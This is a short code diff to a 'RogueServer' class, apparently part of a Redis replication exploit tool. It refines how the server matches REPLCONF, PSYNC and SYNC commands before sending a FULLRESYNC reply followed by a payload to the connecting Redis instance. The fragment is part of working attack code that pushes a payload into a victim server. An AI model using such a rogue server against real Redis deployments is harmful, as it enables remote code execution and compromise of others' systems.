@@ -81,10 +81,10 @@ class RogueServer:
         if "PING" in data:
             resp = "+PONG" + CLRF
             phase = 1
-        elif "REPLCONF" in data:
+        elif any(map(lambda x: x.startswith("REPLCONF"), data)):
             resp = "+OK" + CLRF
             phase = 2
-        elif "PSYNC" in data or "SYNC" in data:
+        elif any(map(lambda x: x.startswith("PSYNC"), data)) or any(map(lambda x: x.startswith("SYNC"), data)):
             resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
             resp += "$" + str(len(payload)) + CLRF
             resp = resp.encode()
